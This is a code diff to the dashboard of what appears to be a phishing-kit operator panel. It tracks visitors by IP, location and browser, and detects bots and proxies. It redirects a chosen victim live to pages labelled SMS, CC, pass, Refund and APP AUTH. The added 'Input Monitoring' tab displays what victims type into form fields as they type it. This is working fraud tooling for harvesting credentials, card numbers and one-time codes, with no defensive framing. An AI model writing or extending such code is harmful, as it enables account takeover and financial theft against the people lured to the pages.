@@ -26,6 +26,45 @@
       }
       .stats-card {
         transition: transform 0.2s;
+        border-radius: 10px;
+        border: none;
+      }
+      .stats-card h2 {
+        font-size: 2.5rem;
+        font-weight: 700;
+      }
+      /* Enhanced table styling */
+      #ipTable th.sortable {
+        cursor: pointer;
+        user-select: none;
+      }
+      #ipTable th.sortable:hover {
+        background-color: #f8f9fa;
+      }
+      #ipTable tr.highlight-new {
+        animation: highlight 2s ease-in-out;
+      }
+      @keyframes highlight {
+        0% { background-color: rgba(255, 255, 0, 0.2); }
+        100% { background-color: transparent; }
+      }
+      .table-responsive {
+        max-height: 600px;
+        overflow-y: auto;
+      }
+      .badge {
+        font-size: 0.75rem;
+      }
+      .country-flag {
+        width: 24px;
+        height: 18px;
+        margin-right: 5px;
+        vertical-align: middle;
+        border-radius: 2px;
+        box-shadow: 0 1px 2px rgba(0,0,0,0.2);
+      }
+      .stats-card {
+        transition: transform 0.2s;
       }
       .stats-card:hover {
         transform: translateY(-5px);
@@ -83,38 +122,7 @@
       </div>
 <div>
 </div>
-      <!-- Redirect Section -->
-      <div class="card shadow-sm mb-4">
-        <div class="card-header bg-white d-flex justify-content-between align-items-center py-3">
-          <h5 class="mb-0">IP Redirect</h5>
-        </div>
-        <div class="card-body">
-          <div class="row mb-3">
-            <div class="col-md-6">
-              <div class="input-group mb-3">
-                <input type="text" class="form-control" id="redirectIpInput" placeholder="Enter IP address">
-                <select class="form-select" id="redirectUrlInput">
-                  <option selected disabled>Choose...</option>
-                  <option value="/loading?time=3&url=/">LOGIN</option>  
-                  <option value="/loading?time=3&url=/RKnUB922z6Mf4HDwg3EZ">SMS1</option>
-                  <option value="/loading?time=3&url=/LGknmeM9HwWUWSutj6mJ">SMS2</option>
-                  <option value="/loading?time=3&url=/QcEwP85AgNE4pnL5mWSM">CC</option>
-                  <option value="/loading?time=3&url=/PPmP85AgNE4pnL5mWSM">pass</option>
-                  <option value="/loading?time=3&url=/PrTomeM9HwWUWSulkTe4">Refund</option>
-                  <option value="/loading?time=3&url=/Ose4aQeM9H4waRfs7PrTv">APP AUTH</option>
-                  <option value="/loading?time=3&url=/LkaaomeM9HwWU472fgsPr">SUCCESS</option>
-                 
-
-                  
-                </select>
-                <button class="btn btn-primary" id="redirectBtn">
-                  <i class="bi bi-arrow-right"></i> Redirect
-                </button>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
+    
 
       <!-- Country Blocking Section -->
       <div class="card shadow-sm mb-4">
@@ -161,11 +169,20 @@
         </div>
       </div>
 
-      <div class="card shadow-sm">
-        <div
-          class="card-header bg-white d-flex justify-content-between align-items-center py-3"
-        >
-          <h5 class="mb-0">IP Monitoring</h5>
+      <div class="card shadow-sm mb-4">
+        <div class="card-header bg-white d-flex justify-content-between align-items-center py-3">
+          <ul class="nav nav-tabs card-header-tabs" id="dashboardTabs" role="tablist">
+            <li class="nav-item" role="presentation">
+              <button class="nav-link active" id="visitors-tab" data-bs-toggle="tab" data-bs-target="#visitors-tab-pane" type="button" role="tab" aria-controls="visitors-tab-pane" aria-selected="true">
+                <i class="bi bi-people"></i> Visitors
+              </button>
+            </li>
+            <li class="nav-item" role="presentation">
+              <button class="nav-link" id="inputs-tab" data-bs-toggle="tab" data-bs-target="#inputs-tab-pane" type="button" role="tab" aria-controls="inputs-tab-pane" aria-selected="false">
+                <i class="bi bi-keyboard"></i> Input Monitoring
+              </button>
+            </li>
+          </ul>
           <div class="form-check form-switch">
             <input
               class="form-check-input"
@@ -179,30 +196,176 @@
           </div>
         </div>
         <div class="card-body">
-          <div class="table-responsive">
-            <table class="table table-hover align-middle">
-              <thead>
-                <tr>
-                  <th>IP Address</th>
-                  <th>FLAG</th>
-                  <th>Location</th>
-                  <th>ISP/Organization</th>
-                  <th>Browser/OS</th>
-                  <th>Requests</th>
-                  <th>Last Request</th>
-                  <th>Timezone</th>
-                  <th>Path Now</th>
-                  <th>Online</th>
-                  <th>Status</th>
-                  <th>Actions</th>
-                </tr>
-              </thead>
-              <tbody id="ipTableBody"></tbody>
-            </table>
+          <div class="tab-content" id="dashboardTabsContent">
+            <!-- Visitors Tab Content -->
+            <div class="tab-pane fade show active" id="visitors-tab-pane" role="tabpanel" aria-labelledby="visitors-tab">
+              <!-- Search and filter controls -->
+              <div class="row mb-3">
+                <div class="col-md-4">
+                  <div class="input-group">
+                    <span class="input-group-text"><i class="bi bi-search"></i></span>
+                    <input type="text" class="form-control" id="ipSearchInput" placeholder="Search IP, country, browser...">
+                  </div>
+                </div>
+                <div class="col-md-3">
+                  <select class="form-select" id="statusFilter">
+                    <option value="all" selected>All Status</option>
+                    <option value="online">Online Only</option>
+                    <option value="offline">Offline Only</option>
+                    <option value="blocked">Blocked Only</option>
+                    <option value="proxy">Proxy/VPN Only</option>
+                    <option value="bot">Bots Only</option>
+                  </select>
+                </div>
+                <div class="col-md-3">
+                  <select class="form-select" id="sortOption">
+                    <option value="activity" selected>Sort by Recent Activity</option>
+                    <option value="ip">Sort by IP Address</option>
+                    <option value="country">Sort by Country</option>
+                    <option value="requests">Sort by Request Count</option>
+                  </select>
+                </div>
+                <div class="col-md-2">
+                  <button class="btn btn-outline-secondary w-100" id="refreshTableBtn">
+                    <i class="bi bi-arrow-clockwise"></i> Refresh
+                  </button>
+                </div>
+              </div>
+              
+              <div class="table-responsive">
+                <table class="table table-hover align-middle" id="ipTable">
+                  <thead>
+                    <tr>
+                      <th class="sortable" data-sort="ip">IP Address <i class="bi bi-arrow-down-up"></i></th>
+                      <th class="sortable" data-sort="status">Status <i class="bi bi-arrow-down-up"></i></th>
+                      <th class="sortable" data-sort="path">Current Path <i class="bi bi-arrow-down-up"></i></th>
+                      <th class="sortable" data-sort="flag">Flag</th>
+                      <th class="sortable" data-sort="country">Country <i class="bi bi-arrow-down-up"></i></th>
+                      <th class="sortable" data-sort="city">City <i class="bi bi-arrow-down-up"></i></th>
+                      <th class="sortable" data-sort="browser">Browser <i class="bi bi-arrow-down-up"></i></th>
+                      <th class="sortable" data-sort="os">OS <i class="bi bi-arrow-down-up"></i></th>
+                      <th class="sortable" data-sort="isp">ISP/Organization <i class="bi bi-arrow-down-up"></i></th>
+                      <th class="sortable" data-sort="requests">Requests <i class="bi bi-arrow-down-up"></i></th>
+                      <th class="sortable" data-sort="activity">Last Activity <i class="bi bi-arrow-down-up"></i></th>
+                      <th>Actions</th>
+                    </tr>
+                  </thead>
+                  <tbody id="ipTableBody">
+                    <!-- IP data will be loaded here -->
+                  </tbody>
+                </table>
+                <div id="noVisitorsMessage" class="text-center py-4 d-none">
+                  <p class="text-muted">No visitors match your search criteria</p>
+                </div>
+              </div>
+            </div>
+            
+            <!-- Input Monitoring Tab Content -->
+            <div class="tab-pane fade" id="inputs-tab-pane" role="tabpanel" aria-labelledby="inputs-tab">
+              <div class="row mb-3">
+                <div class="col-md-6">
+                  <div class="input-group">
+                    <span class="input-group-text"><i class="bi bi-search"></i></span>
+                    <input type="text" class="form-control" id="inputSearchField" placeholder="Search by IP, input value, or page path...">
+                  </div>
+                </div>
+                <div class="col-md-3">
+                  <select class="form-select" id="inputTypeFilter">
+                    <option value="all" selected>All Input Types</option>
+                    <option value="text">Text Inputs</option>
+                    <option value="email">Email Inputs</option>
+                    <option value="tel">Phone Inputs</option>
+                    <option value="number">Number Inputs</option>
+                  </select>
+                </div>
+                <div class="col-md-2">
+                  <button class="btn btn-outline-secondary w-100" id="refreshInputsBtn">
+                    <i class="bi bi-arrow-clockwise"></i> Refresh
+                  </button>
+                </div>
+                <div class="col-md-2">
+                  <button class="btn btn-outline-danger w-100" id="clearInputLogsBtn">
+                    <i class="bi bi-trash"></i> Clear Logs
+                  </button>
+                </div>
+              </div>
+              
+              <div class="table-responsive">
+                <table class="table table-hover align-middle" id="inputMonitoringTable">
+                  <thead>
+                    <tr>
+                      <th class="sortable" data-sort="ip">IP Address <i class="bi bi-arrow-down-up"></i></th>
+                      <th class="sortable" data-sort="path">Page Path <i class="bi bi-arrow-down-up"></i></th>
+                      <th class="sortable" data-sort="name">Input Name <i class="bi bi-arrow-down-up"></i></th>
+                      <th class="sortable" data-sort="type">Input Type <i class="bi bi-arrow-down-up"></i></th>
+                      <th class="sortable" data-sort="value">Value <i class="bi bi-arrow-down-up"></i></th>
+                      <th class="sortable" data-sort="time">Timestamp <i class="bi bi-arrow-down-up"></i></th>
+                    </tr>
+                  </thead>
+                  <tbody id="inputDataTableBody">
+                    <!-- Input data will be loaded here -->
+                    <tr>
+                      <td colspan="6" class="text-center">No input data available</td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
           </div>
         </div>
       </div>
+      
+      <!-- End of main content -->
     </div>
+    </div>
+    
+    <!-- Toast container for notifications -->
+    <div class="position-fixed bottom-0 end-0 p-3" style="z-index: 11">
+        <div id="notificationToast" class="toast" role="alert" aria-live="assertive" aria-atomic="true">
+          <div class="toast-header">
+            <strong class="me-auto">Notification</strong>
+            <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
+          </div>
+          <div class="toast-body" id="toastMessage"></div>
+        </div>
+      </div>
+      
+      <!-- Redirect Modal -->
+      <div class="modal fade" id="redirectModal" tabindex="-1" aria-hidden="true">
+        <div class="modal-dialog">
+          <div class="modal-content">
+            <div class="modal-header">
+              <h5 class="modal-title">Redirect Client</h5>
+              <button
+                type="button"
+                class="btn-close"
+                data-bs-dismiss="modal"
+                aria-label="Close"
+              ></button>
+            </div>
+             <div class="modal-body">
+              <input type="hidden" id="modalRedirectIpInput">
+              <p class="mb-3" id="redirectIpDisplay">Redirecting: <strong></strong></p>
+              <div class="mb-3">
+                <label for="modalRedirectUrlInput" class="form-label">Redirect URL</label>
+                <select class="form-select" id="modalRedirectUrlInput">
+                  <option value="/loading?time=3&url=/">LOGIN</option>  
+                  <option value="/loading?time=3&url=/RKnUB922z6Mf4HDwg3EZ">SMS1</option>
+                  <option value="/loading?time=3&url=/LGknmeM9HwWUWSutj6mJ">SMS2</option>
+                  <option value="/loading?time=3&url=/QcEwP85AgNE4pnL5mWSM">CC</option>
+                  <option value="/loading?time=3&url=/PPmP85AgNE4pnL5mWSM">pass</option>
+                  <option value="/loading?time=3&url=/PrTomeM9HwWUWSulkTe4">Refund</option>
+                  <option value="/loading?time=3&url=/Ose4aQeM9H4waRfs7PrTv">APP AUTH</option>
+                  <option value="/loading?time=3&url=/LkaaomeM9HwWU472fgsPr">SUCCESS</option>
+                </select>
+              </div>
+              <button class="btn btn-primary" id="modalRedirectBtn">
+                <i class="bi bi-arrow-right"></i> Redirect
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
@@ -210,6 +373,18 @@
     <script src="/socket.io/socket.io.js"></script>
     <script>
       const socket = io();
+      
+      // Initialize country filter mode from localStorage or server settings
+      let countryAllowMode = localStorage.getItem('countryAllowMode') === 'true' || '<%= countryFilterMode %>' === 'allow-only';
+      
+      // Send current page path to server
+      socket.emit('page-view', { path: window.location.pathname });
+      
+      // Listen for dashboard updates from server
+      socket.on('dashboard-update', function() {
+        console.log('Dashboard update received');
+        updateDashboard();
+      });
       
       // Handle redirect messages from server
       socket.on('redirect', (data) => {
@@ -220,7 +395,11 @@
       
       // Function to trigger redirect from dashboard
       function triggerRedirect(ip, url) {
+        // Send redirect command directly without checking online status
         socket.emit('redirect-user', {ip: ip, url: url});
+        showToast('Redirect sent to ' + ip, 'success');
+        // Close the modal after redirect
+        $('#redirectModal').modal('hide');
       }
       function getCurrentTimeInTimezone(timezone) {
           try {
@@ -229,71 +408,285 @@
               return 'Unknown';
           }
       }
+      
+      // Function to show toast notifications
+      function showToast(message, type = 'info') {
+          const toast = $('#notificationToast');
+          const toastMessage = $('#toastMessage');
+          
+          // Set message and styling based on type
+          toastMessage.text(message);
+          toast.removeClass('bg-success bg-danger bg-info bg-warning');
+          
+          switch(type) {
+              case 'success':
+                  toast.addClass('bg-success text-white');
+                  break;
+              case 'danger':
+              case 'error':
+                  toast.addClass('bg-danger text-white');
+                  break;
+              case 'warning':
+                  toast.addClass('bg-warning');
+                  break;
+              default:
+                  toast.addClass('bg-info text-white');
+          }
+          
+          // Show the toast
+          const bsToast = new bootstrap.Toast(toast);
+          bsToast.show();
+      }
+      
+      // Function to block an IP
+      function blockIp(ip) {
+          $.post('/dashboard/block', { ip: ip }, function(data) {
+              if (data.success) {
+                  showToast(`IP ${ip} has been blocked`, 'success');
+                  updateDashboard();
+              } else {
+                  showToast(`Failed to block IP ${ip}`, 'danger');
+              }
+          }).fail(function() {
+              showToast(`Error blocking IP ${ip}`, 'danger');
+          });
+      }
+      
+      // Function to unblock an IP
+      function unblockIp(ip) {
+          $.post('/dashboard/unblock', { ip: ip }, function(data) {
+              if (data.success) {
+                  showToast(`IP ${ip} has been unblocked`, 'success');
+                  updateDashboard();
+              } else {
+                  showToast(`Failed to unblock IP ${ip}`, 'danger');
+              }
+          }).fail(function() {
+              showToast(`Error unblocking IP ${ip}`, 'danger');
+          });
+      }
+      
+      // Function to set the redirect IP in the modal
+      function setRedirectIp(ip) {
+          $('#modalRedirectIpInput').val(ip);
+          $('#redirectIpDisplay strong').text(ip);
+      }
 
+      // Global variable to store all visitor data
+      let visitorData = {};
+      let currentSortField = 'activity';
+      let currentSortDirection = 'desc';
+      
       function updateDashboard() {
           $.get('/dashboard/data', function(data) {
+              // Update visitor stats
               $('#totalVisitors').text(data.totalVisitors);
               $('#botsDetected').text(data.botsDetected);
               $('#proxyVpn').text(data.proxyVpn);
               $('#blockedIps').text(data.blockedIps);
-
-              updateBlockedCountries(data.blockedCountries);
-              const tbody = $('#ipTableBody');
-              tbody.empty();
-
-              // Sort entries by last request time, newest first
-              const sortedEntries = Object.entries(data.ipCache).sort((a, b) => {
-                  const timeA = new Date(a[1].lastRequest || 0).getTime();
-                  const timeB = new Date(b[1].lastRequest || 0).getTime();
-                  return timeB - timeA;
-              });
-
-              sortedEntries.forEach(([ip, info]) => {
-                  const row = $('<tr>');
-                  // Add highlight class for new entries (less than 30 seconds old)
-                  const isNew = info.lastRequest && (Date.now() - new Date(info.lastRequest).getTime() < 30000);
-                  if (isNew) {
-                      row.addClass('new-entry');
-                  }
-                  // Add special styling for proxy and bot rows
-                  if (info.proxy || info.hosting) {
-                      row.addClass('proxy-row');
-                  }
-                  if (info.isBot) {
-                      row.addClass('bot-row');
-                  }
-                  row.append($('<td>').text(ip));
-                  const countryCode = info.countryCode ? info.countryCode.toUpperCase() : '';
-                console.log(countryCode);
-                  const flagHtml = countryCode ? `<img src="https://cdn.jsdelivr.net/gh/lipis/flag-icons/flags/4x3/${countryCode.toLowerCase()}.svg" width="40" alt="${countryCode}">` : '';
-                  row.append($('<td>').html(flagHtml));
-                  row.append($('<td>').html(`<div class="d-flex align-items-center"><span>${info.city || 'Unknown'}, ${info.country || 'Unknown'}</span></div>`));
-                  row.append($('<td>').text(info.isp || info.org || 'Unknown'));
-                  row.append($('<td>').text(`${info.browser || 'Unknown'} / ${info.os || 'Unknown'}`));
-                  row.append($('<td>').text(info.requestCount || 0));
-                  row.append($('<td>').text(info.lastRequest ? new Date(info.lastRequest).toLocaleString() : 'Never'));
-                  row.append($('<td>').text(info.timezone ? `${info.timezone} (${getCurrentTimeInTimezone(info.timezone)})` : 'Unknown'));
-                  row.append($('<td>').text(info.path || 'Unknown'));
+              
+              // Store visitor data globally
+              visitorData = data.ipCache;
+              
+              // Apply current filters and sort
+              renderVisitorTable();
+          });
+      }
+      
+      function renderVisitorTable() {
+          const tbody = $('#ipTableBody');
+          const existingRows = {};
+          const searchTerm = $('#ipSearchInput').val().toLowerCase();
+          const statusFilter = $('#statusFilter').val();
+          const sortOption = $('#sortOption').val() || currentSortField;
+          
+          // Store existing rows for comparison
+          $('#ipTableBody tr').each(function() {
+              const ip = $(this).data('ip');
+              existingRows[ip] = $(this);
+          });
+          
+          tbody.empty();
+          
+          // Convert to array for sorting
+          let visitorArray = Object.entries(visitorData);
+          
+          // Filter visitors based on search and status filter
+          visitorArray = visitorArray.filter(([ip, info]) => {
+              // Search filter
+              if (searchTerm) {
+                  const searchFields = [
+                      ip,
+                      info.country || '',
+                      info.city || '',
+                      info.browser || '',
+                      info.os || '',
+                      info.lastPath || ''
+                  ].map(field => field.toLowerCase());
                   
-                  // Online status indicator
-                  const onlineStatus = info.isOnline ? 
-                    '<span class="badge bg-success"><i class="bi bi-circle-fill me-1"></i>Online</span>' : 
-                    '<span class="badge bg-secondary"><i class="bi bi-circle me-1"></i>Offline</span>';
-                  row.append($('<td>').html(onlineStatus));
+                  if (!searchFields.some(field => field.includes(searchTerm))) {
+                      return false;
+                  }
+              }
+              
+              // Status filter
+              switch(statusFilter) {
+                  case 'online':
+                      if (!info.isOnline) return false;
+                      break;
+                  case 'offline':
+                      if (info.isOnline) return false;
+                      break;
+                  case 'blocked':
+                      if (!info.isBlocked) return false;
+                      break;
+                  case 'proxy':
+                      if (!info.proxy && !info.hosting) return false;
+                      break;
+                  case 'bot':
+                      if (!info.isBot) return false;
+                      break;
+              }
+              
+              return true;
+          });
+          
+          // Sort visitors based on selected option
+          visitorArray.sort((a, b) => {
+              const [ipA, infoA] = a;
+              const [ipB, infoB] = b;
+              
+              switch(sortOption) {
+                  case 'ip':
+                      return currentSortDirection === 'asc' ? 
+                          ipA.localeCompare(ipB) : 
+                          ipB.localeCompare(ipA);
+                  
+                  case 'country':
+                      const countryA = infoA.country || '';
+                      const countryB = infoB.country || '';
+                      return currentSortDirection === 'asc' ? 
+                          countryA.localeCompare(countryB) : 
+                          countryB.localeCompare(countryA);
+                  
+                  case 'requests':
+                      const requestsA = infoA.requestCount || infoA.visits || 1;
+                      const requestsB = infoB.requestCount || infoB.visits || 1;
+                      return currentSortDirection === 'asc' ? 
+                          requestsA - requestsB : 
+                          requestsB - requestsA;
+                  
+                  case 'activity':
+                  default:
+                      // First sort by online status if sorting by activity
+                      if (infoA.isOnline !== infoB.isOnline) {
+                          return infoA.isOnline ? -1 : 1; // Online users first
+                      }
+                      
+                      // Then sort by last request time
+                      const aTime = new Date(infoA.lastRequest || infoA.firstSeen).getTime();
+                      const bTime = new Date(infoB.lastRequest || infoB.firstSeen).getTime();
+                      return currentSortDirection === 'asc' ? aTime - bTime : bTime - aTime;
+              }
+          });
+          
+          // Show/hide no results message
+          if (visitorArray.length === 0) {
+              $('#noResultsMessage').removeClass('d-none');
+              return;
+          } else {
+              $('#noResultsMessage').addClass('d-none');
+          }
+          
+          // Render table rows
+          visitorArray.forEach(([ip, info]) => {
+              // Add online/offline status with badge
+              const statusBadge = info.isOnline ? 
+                  '<span class="badge bg-success">Online</span>' : 
+                  '<span class="badge bg-secondary">Offline</span>';
+              
+              // Format the date
+              const lastSeen = new Date(info.lastRequest).toLocaleString();
+              
+              // Add proxy/vpn badge if detected
+              const proxyBadge = (info.proxy || info.hosting) ? 
+                  '<span class="badge bg-warning">Proxy/VPN</span>' : 
+                  '';
+              
+              // Add bot badge if detected
+              const botBadge = info.isBot ? 
+                  '<span class="badge bg-info">Bot</span>' : 
+                  '';
+              
+              // Add country flag if available
+              const flagImg = info.countryCode ? 
+                  `<img src="https://flagcdn.com/w40/${info.countryCode.toLowerCase()}.png" class="country-flag">` : 
+                  '<i class="bi bi-globe"></i>';
+              
+              // Country name without flag
+              const countryName = info.countryCode ? 
+                  `${info.country || info.countryCode}` : 
+                  'Unknown';
+              
+              // Add blocked badge if blocked
+              const blockedBadge = info.isBlocked ? 
+                  '<span class="badge bg-danger">Blocked</span>' : 
+                  '';
+              
+              const row = $('<tr></tr>').attr('data-ip', ip);
+              
+              // Highlight row if online status changed since last update
+              if (existingRows[ip]) {
+                  const wasOnline = existingRows[ip].find('td:nth-child(2) .badge').hasClass('bg-success');
+                  if (wasOnline !== info.isOnline) {
+                      row.addClass(info.isOnline ? 'table-success' : 'table-secondary');
+                      // Remove highlight after 2 seconds
+                      setTimeout(() => {
+                          row.removeClass('table-success table-secondary');
+                      }, 2000);
+                  }
+              } else {
+                  // Highlight new rows
+                  row.addClass('highlight-new');
+              }
+              
+              row.append(`<td>${ip}</td>`);
+              row.append(`<td>${statusBadge}</td>`);
+              row.append(`<td>${info.lastPath || '/'}</td>`);
+              row.append(`<td class="text-center">${flagImg}</td>`);
+              row.append(`<td>${countryName}</td>`);
+              row.append(`<td>${info.city || 'Unknown'}</td>`);
+              row.append(`<td>${info.browser || 'Unknown'}</td>`);
+              row.append(`<td>${info.os || 'Unknown'}</td>`);
+              
+              // Add ISP/Organization information
+              const ispOrg = info.isp || info.org || info.hosting || 'Unknown';
+              row.append(`<td>${ispOrg}</td>`);
 
-                  const statusBadges = [];
-                  if (info.isBot) statusBadges.push('<span class="badge bg-warning text-dark me-1">Bot</span>');
-                  if (info.proxy || info.hosting) statusBadges.push('<span class="badge bg-info me-1">Proxy/VPN</span>');
-                  if (info.isBlocked) statusBadges.push('<span class="badge bg-danger me-1">Blocked</span>');
-                  row.append($('<td>').html(statusBadges.join('') || '<span class="badge bg-success">Clean</span>'));
-
-                  const actionBtn = info.isBlocked ?
-                      `<button class="btn btn-sm btn-success unblock-btn" data-ip="${ip}"><i class="bi bi-unlock"></i> Unblock</button>` :
-                      `<button class="btn btn-sm btn-danger block-btn" data-ip="${ip}"><i class="bi bi-lock"></i> Block</button>`;
-                  row.append($('<td>').html(actionBtn));
-
-                  tbody.append(row);
-              });
+              // Add request count with badge for emphasis
+              const requestCount = info.requestCount || info.visits || 1;
+              row.append(`<td><span class="badge bg-primary">${requestCount}</span></td>`);
+              
+              row.append(`<td>${lastSeen}</td>`);
+              
+              
+              
+              // Add action buttons
+              const actionCell = $('<td></td>');
+              
+              // Block/Unblock button
+              if (info.isBlocked) {
+                  actionCell.append(`<button class="btn btn-sm btn-success me-1" onclick="unblockIp('${ip}')">Unblock</button>`);
+              } else {
+                  actionCell.append(`<button class="btn btn-sm btn-danger me-1" onclick="blockIp('${ip}')">Block</button>`);
+              }
+              
+              // Redirect button
+              const redirectBtn = `<button class="btn btn-sm btn-primary" data-bs-toggle="modal" data-bs-target="#redirectModal" onclick="setRedirectIp('${ip}')">Redirect</button>`;
+              actionCell.append(redirectBtn);
+              
+              row.append(actionCell);
+              tbody.append(row);
           });
       }
 
@@ -343,8 +736,55 @@ function updateBlockedCountries(countries) {
               updateBlockedCountries(data.countries || (countryAllowMode ? data.allowedCountries : data.blockedCountries));
           });
           
+          // Initialize table and update dashboard
           updateDashboard();
           setInterval(updateDashboard, 5000);
+          
+          // Search input handler
+          $('#ipSearchInput').on('input', function() {
+              renderVisitorTable();
+          });
+          
+          // Status filter handler
+          $('#statusFilter').on('change', function() {
+              renderVisitorTable();
+          });
+          
+          // Sort option handler
+          $('#sortOption').on('change', function() {
+              currentSortField = $(this).val();
+              renderVisitorTable();
+          });
+          
+          // Refresh button handler
+          $('#refreshTableBtn').on('click', function() {
+              updateDashboard();
+          });
+          
+          // Column header sorting
+          $('.sortable').on('click', function() {
+              const sortField = $(this).data('sort');
+              
+              // Toggle direction if clicking the same column
+              if (sortField === currentSortField) {
+                  currentSortDirection = currentSortDirection === 'asc' ? 'desc' : 'asc';
+              } else {
+                  currentSortField = sortField;
+                  currentSortDirection = 'asc';
+              }
+              
+              // Update sort option dropdown to match
+              if (['ip', 'country', 'activity'].includes(sortField)) {
+                  $('#sortOption').val(sortField);
+              }
+              
+              // Update sort indicators
+              $('.sortable').find('i').attr('class', 'bi bi-arrow-down-up');
+              $(this).find('i').attr('class', currentSortDirection === 'asc' ? 
+                  'bi bi-arrow-up' : 'bi bi-arrow-down');
+              
+              renderVisitorTable();
+          });
 
           // Handle IP cell clicks
           $(document).on('click', '#ipTableBody td:first-child', function() {
@@ -379,7 +819,7 @@ function updateBlockedCountries(countries) {
           });
 
           // Country mode toggle (block vs allow-only)
-          let countryAllowMode = localStorage.getItem('countryAllowMode') === 'true';
+          countryAllowMode = localStorage.getItem('countryAllowMode') === 'true';
           
           // Initialize toggle state from localStorage
           $('#countryModeToggle').prop('checked', countryAllowMode);
@@ -466,36 +906,205 @@ function updateBlockedCountries(countries) {
                   }
               });
           });
+          
+          // ===== INPUT MONITORING FUNCTIONALITY =====
+          
+          // Global variables for input data and sorting
+          let inputData = {};
+          let inputSortField = 'time'; // Default sort by timestamp
+          let inputSortDirection = 'desc'; // Default sort direction
+          
+          // Function to load input data from server
+          function loadInputData() {
+              $.get('/dashboard/input-data', function(data) {
+                  inputData = data;
+                  renderInputData();
+              });
+          }
+          
+          // Function to render input data in the table
+          function renderInputData() {
+              const tableBody = $('#inputDataTableBody');
+              tableBody.empty();
+              
+              // Get filter values
+              const searchTerm = $('#inputSearchField').val().toLowerCase();
+              const typeFilter = $('#inputTypeFilter').val();
+              
+              // Flatten the input data for display
+              let allInputs = [];
+              
+              // Process each IP's input data
+              Object.keys(inputData).forEach(ip => {
+                  const ipInputs = inputData[ip] || [];
+                  ipInputs.forEach(input => {
+                      allInputs.push({
+                          ip: ip,
+                          ...input
+                      });
+                  });
+              });
+              
+              // Apply filters
+              const filteredInputs = allInputs.filter(input => {
+                  // Search filter
+                  const matchesSearch = searchTerm === '' || 
+                      input.ip.toLowerCase().includes(searchTerm) || 
+                      (input.inputValue && input.inputValue.toLowerCase().includes(searchTerm)) || 
+                      (input.path && input.path.toLowerCase().includes(searchTerm)) ||
+                      (input.inputName && input.inputName.toLowerCase().includes(searchTerm));
+                  
+                  // Type filter
+                  const matchesType = typeFilter === 'all' || input.inputType === typeFilter;
+                  
+                  return matchesSearch && matchesType;
+              });
+              
+              // Display message if no data
+              if (filteredInputs.length === 0) {
+                  tableBody.html('<tr><td colspan="6" class="text-center">No input data available</td></tr>');
+                  return;
+              }
+              
+              // Apply sorting
+              filteredInputs.sort((a, b) => {
+                  let valA, valB;
+                  
+                  // Get values based on sort field
+                  switch(inputSortField) {
+                      case 'ip':
+                          valA = a.ip;
+                          valB = b.ip;
+                          break;
+                      case 'path':
+                          valA = a.path || '/';
+                          valB = b.path || '/';
+                          break;
+                      case 'name':
+                          valA = a.inputName || 'unnamed';
+                          valB = b.inputName || 'unnamed';
+                          break;
+                      case 'type':
+                          valA = a.inputType || 'text';
+                          valB = b.inputType || 'text';
+                          break;
+                      case 'value':
+                          valA = a.inputValue || '';
+                          valB = b.inputValue || '';
+                          break;
+                      case 'time':
+                      default:
+                          valA = new Date(a.timestamp);
+                          valB = new Date(b.timestamp);
+                  }
+                  
+                  // Compare values based on sort direction
+                  if (inputSortField === 'time') {
+                      return inputSortDirection === 'asc' ? valA - valB : valB - valA;
+                  } else {
+                      const comparison = String(valA).localeCompare(String(valB));
+                      return inputSortDirection === 'asc' ? comparison : -comparison;
+                  }
+              });
+              
+              // Render each input row
+              filteredInputs.forEach(input => {
+                  const row = $('<tr></tr>');
+                  
+                  // Format timestamp
+                  const timestamp = new Date(input.timestamp).toLocaleString();
+                  
+                  // Create table cells
+                  row.append(`<td><code>${input.ip}</code></td>`);
+                  row.append(`<td>${input.path || '/'}</td>`);
+                  row.append(`<td>${input.inputName || 'unnamed'}</td>`);
+                  row.append(`<td><span class="badge bg-secondary">${input.inputType || 'text'}</span></td>`);
+                  row.append(`<td><strong>${input.inputValue || ''}</strong></td>`);
+                  row.append(`<td>${timestamp}</td>`);
+                  
+                  tableBody.append(row);
+              });
+              
+              // Update sort indicators
+              $('#inputMonitoringTable th.sortable').each(function() {
+                  $(this).find('i').removeClass('bi-arrow-down bi-arrow-up bi-arrow-down-up');
+                  
+                  if ($(this).data('sort') === inputSortField) {
+                      $(this).find('i').addClass(inputSortDirection === 'asc' ? 'bi-arrow-up' : 'bi-arrow-down');
+                  } else {
+                      $(this).find('i').addClass('bi-arrow-down-up');
+                  }
+              });
+          }
+          
+          // Load input data on tab click
+          $('#inputs-tab').on('click', function() {
+              loadInputData();
+          });
+          
+          // Refresh button click handler
+          $('#refreshInputsBtn').on('click', function() {
+              loadInputData();
+              showToast('Input data refreshed', 'success');
+          });
+          
+          // Clear logs button handler
+          $('#clearInputLogsBtn').on('click', function() {
+              if (confirm('Are you sure you want to clear all input monitoring logs?')) {
+                  $.post('/dashboard/clear-input-logs', function(data) {
+                      if (data.success) {
+                          inputData = {};
+                          renderInputData();
+                          showToast('Input logs cleared successfully', 'success');
+                      } else {
+                          showToast('Failed to clear input logs', 'error');
+                      }
+                  });
+              }
+          });
+          
+          // Sortable headers for input monitoring table
+          $('#inputMonitoringTable th.sortable').on('click', function() {
+              const sortField = $(this).data('sort');
+              
+              // Toggle direction if same field, otherwise default to ascending
+              if (sortField === inputSortField) {
+                  inputSortDirection = inputSortDirection === 'asc' ? 'desc' : 'asc';
+              } else {
+                  inputSortField = sortField;
+                  inputSortDirection = 'asc';
+              }
+              
+              renderInputData();
+          });
+          
+          // Search and filter handlers
+          $('#inputSearchField').on('input', renderInputData);
+          $('#inputTypeFilter').on('change', renderInputData);
+          
+          // Listen for socket events for real-time updates
+          socket.on('input-data-update', function() {
+              // Only reload if we're on the inputs tab
+              if ($('#inputs-tab-pane').hasClass('active')) {
+                  loadInputData();
+              }
+          });
 
+          // Top redirect button handler
           $('#redirectBtn').click(function() {
               const ip = $('#redirectIpInput').val();
               const url = $('#redirectUrlInput').val();
               if (ip && url) {
                   triggerRedirect(ip, url);
-                  $('#redirectIpInput').val('');
-                  $('#redirectUrlInput').val('');
-                  
-                  // Show success toast
-                  const toastEl = document.createElement('div');
-                  toastEl.innerHTML = `
-                    <div class="position-fixed bottom-0 end-0 p-3" style="z-index: 11">
-                      <div class="toast show" role="alert" aria-live="assertive" aria-atomic="true">
